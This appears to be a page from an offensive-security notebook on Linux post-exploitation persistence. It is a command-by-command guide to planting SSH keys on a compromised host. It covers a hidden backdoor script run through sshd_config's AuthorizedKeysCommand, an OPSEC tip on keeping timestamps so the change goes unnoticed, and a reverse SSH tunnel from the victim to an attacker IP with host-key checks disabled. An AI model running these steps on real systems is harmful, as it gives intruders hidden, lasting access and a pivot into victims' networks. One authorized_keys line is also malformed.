---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Living off the Land

## 01 - Copy SSH Key Remotely

Generate an SSH key without any passphrase.

```
userware@hackware-os:~$ ssh-keygen -qt rsa -b 4096 -f ~/.ssh/id_rsa -C '' -N ''

userware@hackware-os:~$ ssh-keygen -qt ed25519 -f ~/.ssh/id_ed25519 -C '' -N ''
```

### 1.1 - Method One: `ssh-copy-id`

Copy the SSH public key to the compromised SSH server. It may prompt you a password to enter.

```
userware@hackware-os:~$ ssh-copy-id [-p <PORT>] -i ~/.ssh/id_rsa.pub -f <username>@<target_IP>
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/userware/.ssh/id_rsa.pub"
<username>@<target_IP>'s password:

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh [-p '<PORT>'] '<username>@<target_IP>'"
and check to make sure that only the key(s) you wanted were added.
```

### 1.2 - Method Two: Copy It Manually

```
$ cat ~/.ssh/id_rsa.pub | ssh [-p <PORT>] <username>@<target_IP> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
```

If you're not connected through SSH let's say you're on `telnet` connection. You can manually copy it with the following commands.

```
userware@hackware-os:~$ cat ~/.ssh/id_rsa.pub

$ mkdir $HOME/.ssh/ && chmod 700 $HOME/.ssh/

echo "<ssh_public_key_contents>" > $HOME/.ssh/authorized_keys

chmod 600 $HOME/.ssh/authorized_keys
```

Authenticate it with the SSH key.

```
$ ssh [-p <PORT>] -i ~/.ssh/id_rsa <username>@<target_IP>
```

### 1.3 - Method Three: SSH Configuration File

> [!IMPORTANT] Elevated Privileges are Required
> Requires root permission to modify the file.

First create a shell script in `/opt/` or place it in a directory that is less suspicious, and make it into a [[Hidden Payloads#^d494ed|hidden file]]. Let's take `/opt/.hidden_backdoor`.

```bash
#!/bin/bash
echo "<ssh_public_key_contents>" > $HOME/.ssh/authorized_keys
```

Ensure it has executable permissions.

```
# chmod +x /opt/.hidden_backdoor
```

Then append the SSH configuration file `/etc/ssh/sshd_config` with this line.

> [!TIP] OPSEC Consideration
> Be sure to take notes of the timestamps before making any modifications to configuration file.

```
AuthorizedKeysCommand /opt/.hidden_backdoor
```

Then restart the SSH server.

```
# systemctl restart sshd
```

## 02 - Generate SSH Key Locally

Create a temp directory.

```
$ mkdir /tmp/keys/
```

Generate an SSH key inside a temporary directory without any passphrase in a compromised system.

```
$ ssh-keygen -qt rsa -b 4096 -f /tmp/keys/id_rsa -C '' -N ''

$ ls /tmp/keys/
id_rsa  id_rsa.pub
```

Copy the SSH key while in the non-interactive shell.

```
$ cat /tmp/keys/id_rsa.pub
```

Paste it in the `authorized_keys` and include restrictions to circumvent security risks.

```
userware@hackware-os:~$ touch ~/.ssh/authorized_keys

userware@hackware-os:~$ cat ~/.ssh/authorized_keys
from="<compromised_system_IP>",command="command="echo 'Only for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty, <ssh_public_key_contents>

userware@hackware-os:~$ chmod 600 ~/.ssh/authorized_keys
```

Authenticate to the SSH server (the attacker).

```
$ ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" <username>@<attacker_IP>
```

Confirm the compromised machine has established connection via SSH with a reverse dynamic port forwarding.

```
userware@hackware-os:~$ ss -antpl
```

Once everything has been completed. You can use any of the backdoor methods that are suitable for reverse SSH.

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xA - Internal Reconnaissance/Filesystem Manipulation/Manual/Living off the Land|Discovery: Filesystem Manipulation]]

- [[04 - Remote Port Forwarding|Pivoting: SSH Remote Port Forward]]

- [[Linux Post Exploitation Persistence References]]